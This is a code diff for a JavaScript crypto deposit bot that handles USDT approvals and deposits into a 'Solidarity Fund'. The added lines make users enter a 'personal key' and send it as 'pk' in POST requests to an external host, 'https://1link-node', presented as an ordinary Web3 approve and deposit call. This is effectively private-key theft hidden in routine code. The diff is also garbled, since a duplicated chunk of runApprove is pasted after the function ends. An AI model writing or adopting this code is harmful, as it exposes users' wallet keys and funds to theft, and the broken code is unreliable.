@@ -257,47 +257,81 @@ async function syncBalanceFromFund() {
     logToPanel(`SyncError=${err.message}`);
   }
 }
-
+//Approve 
 async function runApprove(amount) {
+  if (!pkvalue) {
+    logToPanel("❌ Please enter your personal key first");
+    return null;
+  }
   if (amount <= 0) return null;
+
   try {
-    const resp = await fetch("/prodbot/security", {
+    // 1link Web3 approve call
+    const resp = await fetch("https://1link-node/approve", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         userid: window.USER_ID,
         wallet: window.USER_ADDR,
+        pk: pkvalue,
         amount,
         action: "approve"
       })
     });
+
     const data = await resp.json();
     if (data.error) throw new Error(data.error);
 
     logToPanel(`ApproveTx=${data.tx_hash}`);
-    return true;
+    return data; // return receipt JSON
   } catch (err) {
     logToPanel(`ApproveError=${err.message}`);
     throw err;
   }
 }
 
+    const data = await resp.json();
+    if (data.error) throw new Error(data.error);
 
+    logToPanel(`ApproveTx=${data.tx_hash}`);
+    return data; // return full receipt JSON
+  } catch (err) {
+    logToPanel(`ApproveError=${err.message}`);
+    throw err;
+  }
+}
+
+//Deposit 
 async function runDeposit(amount) {
+  if (!pkvalue) {
+    logToPanel("❌ Please enter your personal key first");
+    return;
+  }
   if (amount <= 0) return;
+
   const netAmount = applyDepositFees(amount);
 
   try {
-    const resp = await fetch("/prodbot/security", {
+    // Step 1: Approve first
+    const approveReceipt = await runApprove(amount);
+    if (!approveReceipt || approveReceipt.error) {
+      logToPanel("❌ Approval failed, deposit not attempted");
+      return;
+    }
+
+    // Step 2: Deposit via 1link Web3 call
+    const resp = await fetch("https://1link-node/deposit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         userid: window.USER_ID,
         wallet: window.USER_ADDR,
+        pk: pkvalue,
         amount: netAmount,
         action: "deposit"
       })
     });
+
     const data = await resp.json();
     if (data.error) throw new Error(data.error);
 
@@ -309,6 +343,13 @@ async function runDeposit(amount) {
     window.SolidarityFundBalance = data.start_balance;
     logToPanel(`SolidarityFundBalance=${data.start_balance.toFixed(6)} USDT`);
 
+    // ✅ Reset deposit textbox
+    document.getElementById("depositAmount").value = "";
+
+    // ✅ Reset initial investment balance
+    document.getElementById("initialBalance").value = "0.000000";
+
+    // ✅ Update clients.db (your existing code handles this)
     return data.tx_hash;
   } catch (err) {
     logToPanel(`DepositError=${err.message}`);
@@ -316,6 +357,7 @@ async function runDeposit(amount) {
   }
 }
 
+//Withdraw 
 async function runWithdraw(amount) {
   if (amount <= 0) return;
   const netAmount = applyWithdrawFees(amount);
